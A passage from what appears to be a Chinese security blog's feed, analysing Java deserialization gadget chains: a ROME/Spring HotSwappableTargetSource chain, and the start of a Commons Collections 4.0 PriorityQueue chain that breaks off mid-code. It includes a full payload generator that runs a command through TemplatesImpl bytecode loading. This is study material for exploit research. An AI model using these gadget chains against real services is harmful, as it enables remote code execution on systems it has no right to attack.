title="HotSwappableTargetSource#equals(Object)"></a>HotSwappableTargetSource#equals(Object)</h4><p>HotSwappableTargetSource 的 equals 方法会调用其成员属性 target 的 equals 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public boolean equals(Object other) &#123;</span><br><span class="line">    return (this == other || (other instanceof HotSwappableTargetSource &amp;&amp;</span><br><span class="line">          this.target.equals(((HotSwappableTargetSource) other).target)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this.target 可以在构造方法中赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public HotSwappableTargetSource(Object initialTarget) &#123;</span><br><span class="line">    Assert.notNull(initialTarget, &quot;Target object must not be null&quot;);</span><br><span class="line">    this.target = initialTarget;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们需要对这段代码中的判断逻辑进行一个分析：</p><ul><li><code>this == other</code>：首先检查 this 和 other 是否是同一个对象引用。如果是，直接返回 true。</li><li><code>other instanceof HotSwappableTargetSource</code>：检查 other 是否是 HotSwappableTargetSource 对象，如果不是，则整个表达式短路，返回 false。</li><li><code>this.target.equals(((HotSwappableTargetSource) other).target)</code>：将 other 强制转换为 HotSwappableTargetSource 类型，由于前面的 instanceof 检查已经保证了 other 确实是 HotSwappableTargetSource 对象，这个转换是没问题的，最后调用 equals 方法比较 this 对象的 target 属性与 other 对象的 target 属性是否相等。</li></ul><p>所以这个方法的参数 other 需要是一个 HotSwappableTargetSource 对象，且 other 的 target 属性值是 ToStringBean 对象。而 this.target 需要是一个 XString 对象。</p><h4 id="HashMap-putVal-int-K-V-boolean-boolean"><a href="#HashMap-putVal-int-K-V-boolean-boolean" class="headerlink" title="HashMap#putVal(int, K, V, boolean, boolean)"></a>HashMap#putVal(int, K, V, boolean, boolean)</h4><p>HashMap 的 putVal 方法会调用参数 key 的 equals 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class="line">               boolean evict) &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span><br><span class="line">    if ((tab = table) == null || (n = tab.length) == 0)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    if ((p = tab[i = (n - 1) &amp; hash]) == null)</span><br><span class="line">        tab[i] = newNode(hash, key, value, null);</span><br><span class="line">    else &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        if (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) // 调用 key 的 equals 方法</span><br><span class="line">            e = p;</span><br><span class="line">        else if (p instanceof TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);</span><br><span class="line">        else &#123;</span><br><span class="line">            for (int binCount = 0; ; ++binCount) &#123;</span><br><span class="line">                if ((e = p.next) == null) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, null);</span><br><span class="line">                    if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st</span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) </span><br><span class="line">                    break;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (e != null) &#123; // existing mapping for key</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            if (!onlyIfAbsent || oldValue == null)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            return oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    if (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值得注意的是，这里要想调用到 key.equals(k) ，需要经过一些判断。</p><p>这里在将传入的键值对存入 Node&lt;K,V&gt;[] tab 数组时，是这样计算下标的：tab[i &#x3D; (n - 1) &amp; hash]，也就是说下一个键值对应该是插在下标为 i 的地方，如果这个下标为 i 的地方没有值，则插入，但如果要插入的键值对的键和已经存在的键相同，那么就会造成 hash 冲突，进入判断，导致 key.equals(k) 执行。</p><p>在上一步的分析中我们知道 HotSwappableTargetSource 的 equals 方法会调用其成员属性 target 的 equals 方法，而 HotSwappableTargetSource 的 equals 方法的参数也需要是一个 HotSwappableTargetSource 对象，为了构造这个条件，那么：</p><p>key.equals(k) 这个式子中的 key 和 k 都需要是 HotSwappableTargetSource 对象，且 key.target 是一个 XString 对象，k.target 是一个 ToStringBean 对象。</p><p>在这里的 hash 冲突中，k 是已经存在于数组中的 key ，而 key 是传入的，所以 k 对应的键值对要先被 put 进去，然后再 put key对应的键值对。</p><p>如下所示，h1.target 是一个 ToStringBean 对象，h2.target 是一个 XString 对象：</p><pre><code>hashMap.put(h1, &quot;test1&quot;);hashMap.put(h2, &quot;test2&quot;);</code></pre><p><strong>反序列化调试</strong> </p><p>第一次进入 putval 方法时插入的下标为 2 ：</p><img src="/images/image-20240611105147293.png"><p>第二次进入 putval 方法时正好取到了这个 2 ：</p><img src="/images/image-20240611105403169.png"><p>可以看到 i 经过 hash 计算后值是 2 ，所以 p 就取到了下标为 2 的元素，然后一对比，发现两个键值对 hash 相同，但是两个键值对的 key 又不是同一个地址引用（ &#x3D;&#x3D; 比较内存地址是否相同），所以就调用到了 key.equals(k) 。</p><p>然后就是一些疑问的解答：</p><p>为什么第二次调用 putval 这个下标 i 正好取到上一个插入的下标呢？</p><p>猜测这是 HashMap 的一种机制，HashMap 中不允许有重复的键，如果插入的两个键值对的键相同，则只会对值做一个更新。这里的逻辑大概就是如果有重复的键，那么经过一系列 Hash 计算后这个下标 i 一定会取到数组中已经存在的键相同的键值对。这是因为当初存入的键值对的下标就是根据键的一些 hash 特征确定的，如果键的 hash 特征相同，再计算一次下标，取到的下标自然就相同了。（不保证一定正确）</p><p>为什么 HashMap 要这样计算下一个要插入的键值对的下标，而不是老老实实把下标加一然后插入呢？</p><p>如果插入的键值对按顺序排列，那么为了避免重复的键出现，每次插入都需要遍历一次集合。用这种方法计算下标，可以快速确定重复的键的位置，而不需要对集合进行遍历，但是会使得插入的下标无规律，有大量空间没有利用。这也是一种典型的用空间换时间的做法。</p><h4 id="HashMap-readObject-java-io-ObjectInputStream"><a href="#HashMap-readObject-java-io-ObjectInputStream" class="headerlink" title="HashMap#readObject(java.io.ObjectInputStream)"></a>HashMap#readObject(java.io.ObjectInputStream)</h4><p>HashMap 的 readObject 调用了 putVal 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                // Read and ignore number of buckets</span><br><span class="line">    int mappings = s.readInt(); // Read number of mappings (size)</span><br><span class="line">    if (mappings &lt; 0)</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +</span><br><span class="line">                                         mappings);</span><br><span class="line">    else if (mappings &gt; 0) &#123; // (if zero, use defaults)</span><br><span class="line">        // Size the table using given load factor only if within</span><br><span class="line">        // range of 0.25...4.0</span><br><span class="line">        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);</span><br><span class="line">        float fc = (float)mappings / lf + 1.0f;</span><br><span class="line">        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((int)fc));</span><br><span class="line">        float ft = (float)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (int)ft : Integer.MAX_VALUE);</span><br><span class="line">        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        // Read the keys and values, and put the mappings in the HashMap</span><br><span class="line">        for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            // 调用了 putVal 方法</span><br><span class="line">            putVal(hash(key), key, value, false, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用栈总结"><a href="#调用栈总结" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject(java.io.ObjectInputStream)</span><br><span class="line">HashMap.putVal(int, K, V, boolean, boolean)</span><br><span class="line">HotSwappableTargetSource.equals(Object)</span><br><span class="line">XString.equals(Object)</span><br><span class="line">ToStringBean#toString()</span><br><span class="line">ToStringBean#toString(String)</span><br><span class="line">BeanIntrospector#getPropertyDescriptors(Class)</span><br><span class="line">BeanIntrospector#getPDs(Class)</span><br><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">TemplatesImpl#getTransletInstance()</span><br><span class="line">TemplatesImpl#defineTransletClasses()</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><h4 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtConstructor;</span><br><span class="line">import org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class HotSwappableTargetSource_payload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取类池</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        // 创建一个名为 Error 的类</span><br><span class="line">        CtClass error = classPool.makeClass(&quot;Error&quot;);</span><br><span class="line">        // 向 Error 对象中添加静态代码块</span><br><span class="line">        CtConstructor constructor = error.makeClassInitializer();</span><br><span class="line">        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        // 设置 Error 的父类为 AbstractTranslet</span><br><span class="line">        CtClass abstractTranslet = classPool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">        error.setSuperclass(abstractTranslet);</span><br><span class="line">        // 将 Error 对象输出成字节数组</span><br><span class="line">        byte[] errorBytecode = error.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 新建利用链 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templatesImpl = new TemplatesImpl();</span><br><span class="line">        setValue(templatesImpl, &quot;_name&quot;, &quot;aaa&quot;);</span><br><span class="line">        setValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;errorBytecode&#125;);</span><br><span class="line">        setValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);</span><br><span class="line"></span><br><span class="line">        // HotSwappableTargetSource 的 equals 方法参数 other 需要是一个 HotSwappableTargetSource 对象</span><br><span class="line">        // other 的 target 属性值需要是 ToStringBean 对象</span><br><span class="line">        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);</span><br><span class="line">        // this.target 需要是一个 XString 对象</span><br><span class="line">        // 为防止 put 时提前命令执行，这里先不设置，随便 new 一个 HashMap 做参数</span><br><span class="line">        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new HashMap&lt;&gt;());</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(h1, &quot;test1&quot;);</span><br><span class="line">        hashMap.put(h2, &quot;test2&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射设置 this.target 为 XString 对象</span><br><span class="line">        setValue(h2, &quot;target&quot;, new XString(&quot;test&quot;));</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://goodapple.top/archives/1145">Java 安全学习 —— ROME 反序列化</a> </p><p><a href="https://www.yuque.com/5tooc3a/jas/mhy3k7vcrdteappp#amGm1">ROME 反序列化</a> </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HotSwappableTargetSource 是在 Spring AOP 中出现的一个类。作用是可以在代理 bean 运行过程中，动态更新实际 bean 对象。HotSwappableTargetSource 类实现了 TargetSource 接口。对外暴露 getTarget 方法，提供真正的 target 对象。再说的明白一点，HotSwappableTargetSourc 是对真正 target 对象的封装。在 Spring 的源码中，体现在 JdkDynamicAopProxy 中的 invoke 方法中。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - Java 反序列化之 CC4+CC2+CC5+CC7 链</title>
    <link href="https://changeyourway.github.io/2024/06/05/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC4+CC2+CC5+CC7%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://changeyourway.github.io/2024/06/05/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC4+CC2+CC5+CC7%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-06-05T06:03:01.842Z</published>
    <updated>2024-06-05T06:08:12.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CC4-链"><a href="#CC4-链" class="headerlink" title="CC4 链"></a>CC4 链</h2><p>在 Commons Collections 版本为 3.2.1 的背景下，可以使用 TransformedMap 或者 LazyMap 来执行 transform 方法，但当 Commons Collections 的版本提升到 4.0 时，就又多出了一种办法：利用 TransformingComparator 来执行 transform 方法。</p><p>先前我们将 AnnotationInvocationHandler 和 HashMap 作为入口类，利用它们的 readObject 方法来反序列化，但是现在我们还可以利用 PriorityQueue 的 readObject 来反序列化。</p><p><strong>实验环境</strong> </p><ul><li>java &#x3D; 8u65</li><li>CommonsCollections &#x3D; 4.0</li></ul><p>pom.xml 中导入如下依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h4 id="利用链之-TransformingComparator"><a href="#利用链之-TransformingComparator" class="headerlink" title="利用链之 TransformingComparator"></a>利用链之 TransformingComparator</h4><p>在 CommonsCollections 4.0 版本中，TransformingComparator 实现了 Serializable 接口，可以被序列化，而在 3.2.1 版本中是不可序列化的。</p><p>TransformingComparator 的 compare 方法中就调用了 transform 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public int compare(I obj1, I obj2) &#123;</span><br><span class="line">    O value1 = this.transformer.transform(obj1);</span><br><span class="line">    O value2 = this.transformer.transform(obj2);</span><br><span class="line">    return this.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transformer 是 TransformingComparator 中定义的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Transformer&lt;? super I, ? extends O&gt; transformer;</span><br></pre></td></tr></table></figure><p>这个属性在构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated) &#123;</span><br><span class="line">    this.decorated = decorated;</span><br><span class="line">    this.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一个构造方法又调用了这个构造方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer) &#123;</span><br><span class="line">    this(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都是 public ，好说。</p><h4 id="入口类之-PriorityQueue"><a href="#入口类之-PriorityQueue" class="headerlink" title="入口类之 PriorityQueue"></a>入口类之 PriorityQueue</h4><h6 id="PriorityQueue-siftDownUsingComparator"><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue#siftDownUsingComparator()"></a>PriorityQueue#siftDownUsingComparator()</h6><p>PriorityQueue 类的 siftDownUsingComparator 方法调用了 comparator 的 compare 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private void siftDownUsingComparator(int k, E x) &#123;</span><br><span class="line">    int half = size &gt;&gt;&gt; 1;</span><br><span class="line">    while (k &lt; half) &#123;</span><br><span class="line">        int child = (k &lt;&lt; 1) + 1;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        int right = child + 1;</span><br><span class="line">        if (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; 0)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        if (comparator.compare(x, (E) c) &lt;= 0)</span><br><span class="line">            break;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>comparator 是 PriorityQueue 中定义的成员属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Comparator&lt;? super E&gt; comparator;</span><br></pre></td></tr></table></figure><p>在构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public PriorityQueue(int initialCapacity,</span><br><span class="line">                     Comparator&lt;? super E&gt; comparator) &#123;</span><br><span class="line">    // Note: This restriction of at least one is not actually needed,</span><br><span class="line">    // but continues for 1.5 compatibility</span><br><span class="line">    if (initialCapacity &lt; 1)</span><br><span class="line">        throw new IllegalArgumentException();</span><br><span class="line">    this.queue = new Object[initialCapacity];</span><br><span class="line">    this.comparator = comparator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个构造方法又被另一个构造方法调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public PriorityQueue(Comparator&lt;? super E&gt; comparator) &#123;</span><br><span class="line">    this(DEFAULT_INITIAL_CAPACITY, comparator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要将 PriorityQueue 的 comparator 属性赋值成 TransformingComparator 对象即可。</p><h6 id="PriorityQueue-siftDown"><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue#siftDown()"></a>PriorityQueue#siftDown()</h6><p>PriorityQueue 的 siftDown 方法调用了 siftDownUsingComparator 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private void siftDown(int k, E x) &#123;</span><br><span class="line">    if (comparator != null)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    else</span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="PriorityQueue-heapify"><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue#heapify()"></a>PriorityQueue#heapify()</h6><p>PriorityQueue 的 heapify 方法调用了 siftDown 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是通过代码我们可以发现，进入 for 循环的条件是 <code>(size &gt;&gt;&gt; 1) - 1 &gt;= 0</code> ，意思就是将 size 的二进制位无符号右移一位（高位用 0 补全）再减去 1 要大于等于 0 ，故而 size 要大于等于 2 。</p><p>size 是 PriorityQueue 中定义的属性，初始值为 0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private int size = 0;</span><br></pre></td></tr></table></figure><p>想要增加 size 的值，可以通过 PriorityQueue 的 offer 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public boolean offer(E e) &#123;</span><br><span class="line">    if (e == null)</span><br><span class="line">        throw new NullPointerException();</span><br><span class="line">    modCount++;</span><br><span class="line">    int i = size;</span><br><span class="line">    if (i &gt;= queue.length)</span><br><span class="line">        grow(i + 1);</span><br><span class="line">    size = i + 1;</span><br><span class="line">    if (i == 0)</span><br><span class="line">        queue[0] = e;</span><br><span class="line">    